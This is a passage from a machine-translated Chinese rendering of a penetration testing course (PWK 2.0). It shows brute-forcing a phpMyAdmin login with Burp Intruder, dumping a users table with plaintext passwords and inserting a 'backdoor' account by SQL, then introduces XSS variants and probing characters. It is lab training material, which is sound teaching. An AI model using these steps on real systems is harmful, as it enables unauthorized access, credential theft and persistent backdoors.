<div style="position:absolute;top:84825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">intruder 的演示版本可以很好地用于这个演示，所以我们将点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ok</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始</font></font></nobr></div>
<div style="position:absolute;top:84844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击并发送我们标记的每个位置的请求，替换为相应的有效负载</font></font></nobr></div>
<div style="position:absolute;top:84864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值。</font><font style="vertical-align: inherit;">Burp Suite 将打开一个带有结果的新窗口：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:85373;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 136：查看攻击结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:85404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果一切配置正确，一个请求将触发 302 响应，从</font></font></nobr></div>
<div style="position:absolute;top:85424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他 200 个回复。</font><font style="vertical-align: inherit;">该条目还包含一个“pmaAuth-1”cookie，它似乎表明</font></font></nobr></div>
<div style="position:absolute;top:85443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录成功。</font><font style="vertical-align: inherit;">根据输出，Burp Suite 能够以 root 身份登录，密码为</font></font></nobr></div>
<div style="position:absolute;top:85463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“根”。</font><font style="vertical-align: inherit;">我们可以在浏览器中手动验证：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:85711;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="73"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 73 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:85744;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:86821;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:86821;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:86821;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">293</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:86245;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 137：phpMyAdmin 控制台</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:86275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个例子可能看起来有些不寻常，但弱或可预测的密码仍然太远</font></font></nobr></div>
<div style="position:absolute;top:86295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在现实世界中很常见，这个演示过程肯定会适用于更复杂的</font></font></nobr></div>
<div style="position:absolute;top:86314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现实世界的例子。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:86899;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="74"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 74 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:86932;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:88009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:88009;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:88009;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">294</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:87022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.14</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:87043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用对 phpMyAdmin 的访问权限直接针对</font></font></nobr></div>
<div style="position:absolute;top:87062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库。</font><font style="vertical-align: inherit;">如果我们点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SQL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以编写我们自己的 SQL 查询。</font><font style="vertical-align: inherit;">我们将更深入地介绍 SQL</font></font></nobr></div>
<div style="position:absolute;top:87081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块的后面，但现在，我们将输入“select * from webappdb.users;” </font><font style="vertical-align: inherit;">作为我们的查询</font></font></nobr></div>
<div style="position:absolute;top:87101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检索</font><i><font style="vertical-align: inherit;">webappdb</font></i><font style="vertical-align: inherit;">数据库中</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:87561;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 138：通过 phpMyAdmin 执行查询 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:88087;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="75"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 75 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:88120;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:89197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:89197;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:89197;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">295</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:88210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.15</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Go 后</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们得到了查询的结果，包括明文密码。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:88736;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 139：通过 phpMyAdmin 查看查询结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:88767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们不仅可以查询数据库和查看表内容，还可以将数据插入到</font></font></nobr></div>
<div style="position:absolute;top:88786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:89275;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="76"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 76 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:89308;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:90385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:90385;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:90385;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">296</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:89398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.16</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们通过单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示查询框</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并输入“插入到”</font><font style="vertical-align: inherit;">来创建一个新用户</font></font></nobr></div>
<div style="position:absolute;top:89438;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">webappdb.users(password, username) VALUES ("backdoor","backdoor");"。</font><font style="vertical-align: inherit;">此查询将添加一个</font></font></nobr></div>
<div style="position:absolute;top:89457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">新用户名为“backdoor”，密码为“backdoor”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:89918;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 140：插入新的管理员用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:89948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Go</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行查询。</font><font style="vertical-align: inherit;">页面将更新并显示“已插入 1 行”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:90274;left:386"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 141：查询结果 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:90463;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="77"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 77 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:90496;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:91573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:91573;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:91573;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">297</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:90586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.2.17</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:90607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示查询框</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，输入“select * from</font></font></nobr></div>
<div style="position:absolute;top:90626;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">webappdb.users;”，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Go</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这应该返回三个记录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:91157;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 142：验证我们的用户已添加</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这只是我们可以通过访问 PhpMyAdmin 和 SQL 查询执行的操作的一个简短示例。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:91207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们演示 SQL 注入和利用 SQL 时，将在本模块的后面更深入地介绍这一点</font></font></nobr></div>
<div style="position:absolute;top:91226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询访问服务器上的外壳。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:91261;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.1.3 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Burp Intruder 访问在您的 Windows 10 实验室上运行的 phpMyAdmin 站点</font></font></nobr></div>
<div style="position:absolute;top:91310;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:91338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在“users”表中插入一个新用户。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:91373;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2 跨站脚本（XSS）</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其中的一个防守严密的网络应用程序的最重要的特点是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据的消毒</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">256</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一</font></font></nobr></div>
<div style="position:absolute;top:91430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理用户输入的过程，删除或转换所有危险字符或</font></font></nobr></div>
<div style="position:absolute;top:91450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串。</font><font style="vertical-align: inherit;">未经消毒的数据允许攻击者注入并可能执行恶意代码。</font><font style="vertical-align: inherit;">什么时候</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:91523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">256 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Data_validation</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:91651;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="78"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 78 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:91684;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:92761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:92761;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:92761;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">298</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:91780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个未经处理的输入显示在网页上，这会创建</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跨站点脚本</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(XSS) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">257</font></font></font></nobr></div>
<div style="position:absolute;top:91799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脆弱性。</font></font></nobr></div>
<div style="position:absolute;top:91832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">曾经被认为是一个相对低风险的漏洞，今天的 XSS 既高风险又普遍，</font></font></nobr></div>
<div style="position:absolute;top:91851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许攻击者将客户端脚本（例如 JavaScript）注入其他人查看的网页中</font></font></nobr></div>
<div style="position:absolute;top:91871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户。</font></font></nobr></div>
<div style="position:absolute;top:91904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在三种跨站脚本变体：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">258</font></font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反射</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">259</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 DOM 的</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">260</font></font></font></nobr></div>
<div style="position:absolute;top:91936;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储型 XSS 攻击</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，也称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">持久型 XSS</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，当利用负载存储在一个</font></font></nobr></div>
<div style="position:absolute;top:91955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据库或以其他方式由服务器缓存。</font><font style="vertical-align: inherit;">然后 Web 应用程序检索此有效负载并</font></font></nobr></div>
<div style="position:absolute;top:91975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其显示给查看易受攻击页面的任何人。</font><font style="vertical-align: inherit;">因此，单个存储型 XSS 漏洞可以</font></font></nobr></div>
<div style="position:absolute;top:91994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击该网站的所有用户。</font><font style="vertical-align: inherit;">存储型 XSS 漏洞经常存在于论坛软件中，尤其是在</font></font></nobr></div>
<div style="position:absolute;top:92014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">评论部分，或在产品评论中。</font></font></nobr></div>
<div style="position:absolute;top:92047;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反射型 XSS 攻击</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常在精心设计的请求或链接中包含负载。</font><font style="vertical-align: inherit;">网络应用程序</font></font></nobr></div>
<div style="position:absolute;top:92066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取此值并将其放入页面内容中。</font><font style="vertical-align: inherit;">此变体仅攻击提交者</font></font></nobr></div>
<div style="position:absolute;top:92085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求或查看链接。</font><font style="vertical-align: inherit;">反射型 XSS 漏洞经常出现在搜索字段和</font></font></nobr></div>
<div style="position:absolute;top:92105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果，以及任何包含在错误消息中的用户输入。</font></font></nobr></div>
<div style="position:absolute;top:92137;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 DOM 的 XSS 攻击</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与其他两种类型相似，但仅发生在页面内部</font></font></nobr></div>
<div style="position:absolute;top:92157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档对象模型 (DOM)。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">261</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这一点上我们不会深入讨论很多细节，而是一个浏览器</font></font></nobr></div>
<div style="position:absolute;top:92176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解析页面的 HTML 内容并生成内部 DOM 表示。</font><font style="vertical-align: inherit;">JavaScript 可以</font></font></nobr></div>
<div style="position:absolute;top:92195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以编程方式与此 DOM 交互。</font></font></nobr></div>
<div style="position:absolute;top:92228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当使用用户控制的值修改页面的 DOM 时，会发生此变体。</font><font style="vertical-align: inherit;">基于DOM的XSS</font></font></nobr></div>
<div style="position:absolute;top:92247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以存储或反映。</font><font style="vertical-align: inherit;">关键区别在于，基于 DOM 的 XSS 攻击发生在浏览器</font></font></nobr></div>
<div style="position:absolute;top:92267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解析页面的内容并执行插入的 JavaScript。</font></font></nobr></div>
<div style="position:absolute;top:92300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无论 XSS 负载如何交付和执行，注入的脚本都在</font></font></nobr></div>
<div style="position:absolute;top:92319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看受影响页面的用户的上下文。</font><font style="vertical-align: inherit;">也就是说，用户的浏览器，而不是网络</font></font></nobr></div>
<div style="position:absolute;top:92338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序，执行 XSS 负载。</font><font style="vertical-align: inherit;">尽管如此，这些攻击仍会产生重大影响</font></font></nobr></div>
<div style="position:absolute;top:92358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在会话劫持中，强制重定向到恶意页面，执行本地应用程序</font></font></nobr></div>
<div style="position:absolute;top:92377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户等等。</font><font style="vertical-align: inherit;">在以下部分中，我们将探讨其中的一些攻击。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:92411;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.2.1 识别 XSS 漏洞</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过检查 Web 应用程序并识别输入来找到 XSS 的潜在入口点</font></font></nobr></div>
<div style="position:absolute;top:92465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受未净化输入的字段（例如搜索字段），这些输入显示为输出</font></font></nobr></div>
<div style="position:absolute;top:92485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后续页面。</font></font></nobr></div>
<div style="position:absolute;top:92517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们确定了一个入口点，我们就可以输入特殊字符，并观察输出以查看是否</font></font></nobr></div>
<div style="position:absolute;top:92537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何特殊字符返回未经过滤。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:92631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">257 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cross-site_scripting</font></font></font></nobr></div>
<div style="position:absolute;top:92651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">258 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019 年），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Cross-site_scripting#Persistent_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(or_stored)</font></font></font></nobr></div>
<div style="position:absolute;top:92671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">259 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（反映）</font></font></font></nobr></div>
<div style="position:absolute;top:92691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">260 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Cross-site_scripting#Server-side_versus_DOM-based_vulnerabilities</font></font></font></nobr></div>
<div style="position:absolute;top:92711;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">261 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Document_Object_Model</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:92839;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="79"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 79 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:92872;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:93949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:93949;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:93949;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">299</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:92968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于此目的的最常见的特殊字符包括：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt; &gt; '" { } ;</font></font></nobr></div>
